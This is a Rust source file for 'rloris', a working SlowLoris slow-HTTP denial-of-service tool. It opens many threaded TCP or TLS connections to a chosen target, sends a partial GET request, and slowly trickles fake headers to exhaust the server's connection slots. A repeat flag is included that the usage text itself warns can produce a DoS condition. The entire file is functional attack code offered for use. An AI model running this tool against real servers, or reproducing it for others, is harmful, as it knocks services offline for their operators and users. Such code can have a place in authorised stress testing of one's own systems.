// For std::thread::sleep_ms.
#![allow(deprecated)]

extern crate docopt;
extern crate rustc_serialize;
extern crate openssl;

use docopt::Docopt;
use std::net::TcpStream;
use std::io::{Read, Write};
use std::thread;
use std::thread::sleep_ms;
use openssl::ssl::{SslMethod, SslConnectorBuilder};

const USAGE: &'static str = "
rloris - SlowLoris and other Slow HTTP DoSes in Rust

Usage:
    rloris <target> [--ssl] [--port=<port>] [--timeout=<timeout>] [--cycles=<cycles>] [--domain=<domain>] [--nofinalize] [--repeat] [--threads=<threads>]
    rloris (-h | --help)
    rloris --version

Options:
    -h --help       Show this screen.
    --ssl           Use SSL. Changes default port to 443.
    --port=P        Use port P. Defaults to 80 for plaintext, 443 for SSL.
    --timeout=T     Total time for a single request, in milliseconds. [default: 10000]
    --cycles=C      Total number of additional \"keepalive\" headers to be sent. [default: 10]
    --domain=D      Override the domain name for SSL connections (e.g., if you're connecting to a raw IP address)
    --repeat        Perform the attack repeatedly (WARNING - Can produce a DoS condition!)
    --threads=T     The number of concurrent threads to spin off. [default: 1]
    --version       Display version information.
";

#[derive(Debug, RustcDecodable)]
struct Args {
    arg_target: String,
    flag_port: Option<usize>,
    flag_timeout: u32,
    flag_cycles: u32,
    flag_ssl: bool,
    flag_nofinalize: bool,
    flag_domain: Option<String>,
    flag_repeat: bool,
    flag_threads: usize,
}

#[derive(Debug, Clone)]
struct Target {
    domain: String,
    designator: String,
}

impl Target {
    fn new(target: String, port: usize) -> Self {
        Target {
            domain: format!("{}", target),
            designator: format!("{}:{}", target, port)
        }
    }
    fn get_designator(&self) -> &str {
        &self.designator
    }
    fn get_domain(&self) -> &str {
        &self.domain
    }
    fn set_domain(&mut self, domain: &str) {
        self.domain = domain.into();
    }
}

/// request_attack performs a SlowLoris style delay request attack against a server
/// which can be written to via the given `connection` (reader/writer). 
/// `timeout` is the total time for the attack to progress, in milliseconds.
/// `cycles` is the number of times a new fake header should be written, or 0 for no additional headers.
fn request_attack<T: Sized + Read + Write>(connection: &mut T, timeout: u32, cycles: u32, finalize: bool) {
    // Start a valid HTTP request
    connection.write_all(b"GET / HTTP/1.0\r\n")
        .expect("[REQUEST] !!! Couldn't write GET request.");
    println!("[REQUEST] Wrote GET request.");

    // Delay cycle
    // Conditional here limits requests to one per ten milliseconds
    let real_cycles = if cycles < timeout/10 {cycles} 
                      else {println!("[REQUEST] Too many cycles! Limiting."); timeout/10};
    println!("[REQUEST] Beginning delay attack: {} ms, {} cycles, {} ms/cycle.", timeout, real_cycles, timeout/real_cycles);
    for _ in 0..(real_cycles) {
        // Timeout / cycles gives the number of ms for one cycle
        sleep_ms(timeout / cycles);
        connection.write_all(b"X-Not-Real: \"Some Bullshit\"\r\n")
            .expect("[REQUEST] !!! Couldn't write fake header.");
    }

    if finalize {
        connection.write_all(b"\r\n")
            .expect("[REQUEST] !!! Couldn't write finalizer");
        println!("[REQUEST] Wrote finalizer.");
        let mut res = vec![];
        connection.read_to_end(&mut res).unwrap();
        println!("[REQUEST] Response length: {}", res.len());
    } else {
        println!("[REQUEST] Terminating without finalizer.");
    }
}

fn main() {
    let args: Args = Docopt::new(USAGE)
                            .and_then(|d| d.decode())
                            .unwrap_or_else(|e| e.exit());

    // The default port is 80, but for SSL it's 443.
    let default_port = if args.flag_ssl { 443 } else { 80 };
    let port = args.flag_port.unwrap_or(default_port);

    let finalize = !args.flag_nofinalize;
    let cycles = args.flag_cycles;
    let timeout = args.flag_timeout;
    let repeat = args.flag_repeat;
    let threads = args.flag_threads;
    let ssl = args.flag_ssl;
    // Extract targetting information
    let mut target = Target::new(args.arg_target, port);

    // Check for domain override
    if let Some(domain) = args.flag_domain {
        target.set_domain(&domain);
    }

    println!("[CONTROL] Target: {:?}", target);

    loop {
        let mut handles = Vec::with_capacity(threads);
        for _ in 0..threads {
            let target = target.clone();
            handles.push(
                thread::spawn(move || {
                    // Attempt to connect to the target.
                    let mut tcp_stream = TcpStream::connect(target.get_designator()).expect("[CONTROL] !!! Couldn't connect. Aborting.");
                    println!("[CONTROL] Succesfully connected to {}.", target.get_designator());
                    // If needed, connect SSL to the target.
                    if ssl {
                        // Attempt to set up SSL
                        let connector = SslConnectorBuilder::new(SslMethod::tls())
                            .expect("[CONTROL] !!! Failed to build SSL functionality.")
                            .build();
                        println!("[CONTROL] Built SSL functionality.");

                        let mut ssl_stream = connector.connect(target.get_domain(), tcp_stream).expect("[CONTROL] !!! Couldn't connect TLS. Did you provide a domain name, not an IP?");
                        println!("[CONTROL] Successfully connected with TLS.");
                        request_attack(&mut ssl_stream, timeout, cycles, finalize);
                    } else {
                        request_attack(&mut tcp_stream, timeout, cycles, finalize)
                    }
                })
            );
        }
        for handle in handles {
            let val = handle.join();
        }
        if !repeat {break;}
    }
}
